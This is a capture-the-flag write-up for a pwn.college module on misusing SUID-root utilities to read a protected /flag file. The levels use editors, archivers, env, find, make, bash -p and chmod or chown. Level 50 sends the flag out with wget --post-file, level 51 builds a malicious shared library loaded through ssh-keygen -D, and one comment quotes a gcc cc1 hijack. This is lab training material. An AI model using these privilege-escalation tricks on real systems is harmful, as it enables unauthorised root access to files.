This module shown me a lot of common command tools, including *text filters*, *text editors*, *encoding tools*,
*compress/archive tools*, *environmtent/system control tools*, *stream text editors*,
*programming language compilers/interpreters*.

Unitl lvl 26 did I find that the first path in `PATH` variable is `/run/challenge/bin` which
is a symbolic link of `/challenge/bin`. This means in all the below writeups,
we can use the command tools by input their name directly instead of provide a prefix of `/challenge/bin`.

# lvl 1~22
> Lets you directly read the flag!
### lvl 1
Remember to run `/challenge/babysuid` first.
`/challenge/bin/cat /flag`

### lvl 2
`/challenge/bin/more /flag`

### lvl 3
`echo $(/challenge/bin/less /flag)`

### lvl 4
`/challenge/bin/tail /flag`

### lvl 5
`/challenge/bin/head /flag`

### lvl 6
`/challenge/bin/sort /flag`

---
> Shows you that an over-privileged editor is a very powerful tool!
Remember to use `man`.
### lvl 7
I like vim. Use `:q!` to quit.  
`/challenge/bin/vim /flag`

### lvl 8
I haven't use emacs. But I know `ctrl+z`.  
`/challenge/bin/emacs /flag`

### lvl 9
nano is good.  
`/challenge/bin/nano /flag`

---
> Requires you to understand their output to derive the flag from it!
### lvl 10
`/challenge/bin/rev /flag | /challenge/bin/rev`

### lvl 11
regex is helpful.  
`/challenge/bin/od -c /flag | perl -pe 's/\s|^\d*//g'`

### lvl 12
`/challenge/bin/hd /flag | perl -pe 's/^.*?\|//g; s/\|\s$//g'`

### lvl 13
It's good not to use regex.  
`/challenge/bin/xxd /flag | xxd -r`

### lvl 14
`/challenge/bin/base32 /flag | base32 -d`

### lvl 15
`/challenge/bin/base64 /flag | base64 -d`

### lvl 16
`/challenge/bin/split /flag` and the flag is at a file named `xaa`, so `cat xaa; rm $_`.

---
> Forces you to understand different archive formats!
But I can always trust vim. It can open `.zip`, `.a`, `.tar` files, etc.
### lvl 17
`/challenge/bin/gzip /flag -c | gzip -dc`

### lvl 18
`/challenge/bin/bzip2 -c /flag | bzip2 -dc`

### lvl 19
I can't find better one-line writeup.  
`/challenge/bin/zip draft.zip /flag && unzip draft.zip && cat flag && rm draft.zip flag`

### lvl 20
`/challenge/bin/tar -cf tmp.tar /flag && tar -Oxf tmp.tar && rm tmp.tar -f`

### lvl 21
`/challenge/bin/ar r tmp.a /flag && ar p tmp.a && rm tmp.a -f`

### lvl 22
`echo "/flag" | cpio -o`

# lvl 23
Until now I know that .iso file is just a common archive of files, which can be opened by winrar.

This is really a big challenge.
I just readthe all content in the man page of `genisoimage` and find nothing to get the flag.

When I input `/challenge/bin/genisoimage /flag`, only this comes up:
```err.log
hacker@program-misuse~level23:~/program_misuse$ /challenge/bin/genisoimage -o tmp.iso /flag
/challenge/bin/genisoimage: Permission denied. File /flag is not readable - ignoring
```

I think it's impossible for me to just read the man page to find the resolution.

Finally I go to find the answer on github.
I find a senior who took cse466-f2023.
He/She used `strace` to find that the process of `genisoimage` automatically change its eUID.

And I implement it:
```sh
hacker@program-misuse~level23:~/program_misuse$ strace /challenge/bin/genisoimage /flag 2> out.log
hacker@program-misuse~level23:~/program_misuse$ cat out.log | grep uid | head
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
getuid()                                = 1000
setreuid(-1, 1000)                      = 0
getuid()                                = 1000
```
Maybe it's because there is no suid-debug file so the process can't set eUID to 0.

And the senior used brute force to complete.
```
for op in $(genisoimage --help 2>&1 | grep FILE | awk '{print $1}'); do /challenge/bin/genisoimage $op /flag; done 2>&1 | grep pwn.college
```

---
> Enables you to read flags by making them execute other commands!

### lvl 24
`env` display or change the environment variables.  
`/challenge/bin/env -i cat /flag`

### lvl 25
The answer is told in the video.  
`find /flag -exec cat '{}' \;`

### lvl 26
Wow! It's `make`. Maybe it's kind of difficult for who haven't used it.  
`make -f <(printf "all:\n\tcat /flag")`

### lvl 27
`nice` change the priority of the process.  
`nice cat /flag`

### lvl 28
`timeout 1 cat /flag`

### lvl 29
`stdbuf` is for Linux to control buffer flush of command.
`stdbuf -oL cat /flag`

# lvl 30
`setarch` only execute program. It seems that it's child process can't inherit the eUID.

I tried `setarch linux32 <(cat /flag)`, or writing a shell script which contains `cat /flag` and `chmod` it,
or writing python script with appropriate shebang; all these made no sense.

So I need a compiled program to let the `setarch` to execute the commands directly.
I've learned assembly in at `assembly crash course` module but I really don't want use it.
I chosed C language.
```c
#include <stdlib.h>
#include <stdio.h>

int main() {
        FILE* fp = fopen("/flag", "r");
        char buf[100];
        fgets(buf, 90, fp);
        printf("%s", buf);
        fclose(fp);
}
```
Use `gcc` to compile it. And run `setarch`.

`gcc read_flag.c -o ./read_flag && setarch linux32 $_`

### lvl 31
`watch -n 0.1 ps aux` is equal to `top` :D. But it may help in some situations such as `timeout 5 watch -n 1 nvida-smi`.

The common `watch cat /flag` will produce a child process of `/bin/sh`, so use `-x` flag:  
`watch -x cat /flag`.

### lvl 32
The space of file systemp is used up in this challenge. It's strange, but it doesn't matter.

It seems that this tool is better than `nc` but didn't update for years.  
`socat PIPE:/flag -`

---
> Requires some light programming to read the flag!
### lvl 33
This is intersting. I guess that the IDA on Linux that I used is like to used this.  
`whiptail --textbox /flag 9 60`

### lvl 34
Awk!!! Very important for hackers but I can't use it smoothly now.  
`awk '{print}' /flag`

### lvl 35
Also a common text handle tool.  
`sed 'q' /flag`

### lvl 36
This is an ancient tool :D.  
`printf ".\nq\n" | ed /flag`

---
> Lets you get the flag by doing tricks with permissions!
### lvl 37
`chown $(whoami) /flag && cat $_`

### lvl 38
`chmod 444 /flag && cat $_`


### lvl 39
`cp --no-preserve=mode,ownership /flag ./tmp && cat $_ && rm $_ -f`

# lvl 40
I remembered I have done this challenge once. And that time I looked other's writeup.
This time I still can't solve it. `T_T`

We can move the file everywhere, and it will stay there forever.
So just `mv /flag ~/tmp` to somewhere and sometime you can read it as root user.

It can be the `level 1` or other levels you can get the root privilege to read the `~/tmp` file.

But I want to choose practice mode to start. `sudo ~/tmp && rm $_ -f`.

It just like what I did at `Using Practice Mode` challenge in `Using the Dojo` module in `Getting Started`.

---
> Lets you read the flag because they let you program anything!
### lvl 41
`perl` is what I used at lvl 11. It's a programm language.  
`perl -pe ''  /flag`

### lvl 42
`python -c 'with open("/flag") as fp: print(fp.read())'`

### lvl 43
I know it but it's my first time to use it.  
`ruby <(printf 'puts IO.readlines("/flag")[0]')`

# lvl 44
But then I use built-in regex in man page to search the keyword of `euid`, `uid`, `effective`.
I find a `-p` flag which is like hidden intentially into the 4 thousands of lines of the man page.

`bash -p -c "cat /flag`

---
> Just straight up wasn't designed to let you read files!
### lvl 45
If only I can read sth...  
`date -f /flag`

### lvl 46
This tool is to check hardware of computer.  
`dmesg -F /flag`

### lvl 47
It's really a uncommon flag that I haven't used.  
`wc --files0-from=/flag`

# lvl 48
This challenge has a lot of flaws.

**my experence**

I read the manpage and guessed for at lease 2 hours.  

Then I went to the answer. And the answer make no sense. You can see the comment of this markdown file for detials.
<!-- I can't do it. There's no writeup(It seems that the resolution is outdated).

I read the manpage and guessed for at lease 2 hours.  
I went to the answer. The method is use c file with `#include "/flag"` but now it make no sense.
Exactly, I've tried `#include </flag>` before I went to answer.

I go to ask chat-gpt and it gave me a useless solution to hijack the components of gcc that 
```sh
echo -e '#!/bin/sh\ncat /flag' > /tmp/cc1
chmod +x /tmp/cc1
PATH=/tmp:$PATH
/challenge/bin/gcc -x c - <<< "int main(){}"
```

Then it also told me to use plugin of `gcc` but there's no `plugin.h` in the docker.
-->
After I skipped this level, I finished them all.<!-- except for level 51 -->
And then I found another answer online -- `gcc -x c -E`.

It will finally works. But before that, I have something to do. And before that before,
I should organize my thought to finish the challenge.

I should find the `-E` flag which do the first step of compiling a file. This is the minor of many flags of `gcc`
that I can directly in put the file. The other flag such as `-g`, `-c`, `-s` will do the superset of things
that `-E` will do. In fact, I only find two flags(in the almost 20k lines texts) of `gcc` -- `-E` and `-L`.

`-L` didn't give me error but displayed nothing about `/flag` after I compile the files by
`gcc hello_world.c -L /flag -o out`. I use `hd` tools(which occurs at lvl 12) to confirmed it.

Using `-E` by `gcc -E /flag` would give me an error:
`gcc: warning: /flag: linker input file unused because linking not done`.
This is because `Input files that don't require preprocessing are ignored.` tells from man page.
I spent at least an hour to find a way to prevent that ignorance
(because I think all warnings in compiling c can be eliminated)
and failed. And I went to find the first answer
which in the comment of this markdown file. Then I skipped this level.

If I was smarter, I should notice that there's a strange word of that warning -- `link`.
This means `gcc -E /flag` didn't preprocess(that `-E` should do) but do the linking.
I asked the chat-gpt, it says it's because the `/flag` has no file extension so
it may misclassify it as `.o` file. That's why I should add a `-x` flag to treat `/flag` is the C source code.
The solution is `gcc -x c -E /flag`.

But I didn't tell the strange thing.

**strange thing**
In fact, the first time I input `gcc -E /flag`, an error occurs:
```sh
$ gcc -x c -E /flag
gcc: fatal error: cannot execute ‘cc1’: execvp: No such file or directory
```
After my trials to restart challenge for times. I found that `/bin/gcc` can compile and `/challenge/bin/gcc` can't.
I strace the one in `/challenge`: `strace gcc hello_world.c -o hello 2>&1 | grep cc1`
```log
stat("/challenge/bin/../lib/gcc/x86_64-linux-gnu/9/cc1", 0x7ffdaf50db60) = -1 ENOENT (No such file or directory)
stat("/challenge/bin/../lib/gcc/x86_64-linux-gnu/cc1", 0x7ffdaf50db60) = -1 ENOENT (No such file or directory)
stat("/challenge/bin/../lib/gcc/cc1", 0x7ffdaf50db60) = -1 ENOENT (No such file or directory)
stat("/challenge/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../x86_64-linux-gnu/bin/x86_64-linux-gnu/9/cc1", 0x7ffdaf50db60) = -1 ENOENT (No such file or directory)
stat("/challenge/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../x86_64-linux-gnu/bin/x86_64-linux-gnu/cc1", 0x7ffdaf50db60) = -1 ENOENT (No such file or directory)
stat("/challenge/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../x86_64-linux-gnu/bin/cc1", 0x7ffdaf50db60) = -1 ENOENT (No such file or directory)
```
So I added the path where there's the `cc1` file: `PATH="$PATH:/bin/gcc/x86_64-linux-gnu/bin/x86_64-linux-gnu/9`.

After that I can use `gcc -x c -E /flag` to get the answer.

### lvl 49
It's easy than lvl 48. That really let me lose confidence.  
`as /flag`

# lvl 50
> Just straight up wasn't designed to let you read files! This level has a "decoy" solution that looks like it leaks the flag, but is not correct. If you're submitting what you feel should be a valid flag, and the dojo doesn't accept it, try your solution against a file with uppercase characters to see what's going on.

My solution use the knowledge in `Talking Web` module.

As the hint tells that the `wget -i /flag` can gave me decoy flag.

Then I just send `/file` in the man page of `wget` and press `n` over and over again
(Maybe I should use `/^*.-*.file` instead). Finally I found the `--post-file` flag of `wget`.

So open two tabs of terminal. At the first terminal set up a server to listen http request: `nc 127.0.0.1 8000`.
Keep that on and go to the second terminal, use `wget --post-file /flag http://localhost:8000` to 
send the content of flag to the server.

# lvl 51
> Shows how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part)!

I can't do it.

In fact I didn't suspect the `-D` flag. I don't even know what's that means.
```man page
-D pkcs11
               Download the public keys provided by the PKCS#11 shared
               library pkcs11.
```
Maybe it's because of my poor English. I don't know what's the mean of download and don't know the `shared library`
is a C static shared library.

Anyhow, here's the writeup:
```c malicious.c
 // malicious.c
 #include <stdlib.h>
 #include <stdio.h>

char *C_GetFunctionList="";

__attribute__((constructor)) void init() {
        // Or print to stderr
        FILE *f = fopen("/flag", "r");
        if (f) {
                char buf[100];
                fgets(buf, 100, f);
                fprintf(stderr, "Flag: %s", buf);
                fclose(f);
        }
        exit(0);
}
```
```sh
$ gcc -shared -fPIC -o malicious.so malicious.c
$ ssh-keygen -D ./malicious.so
```
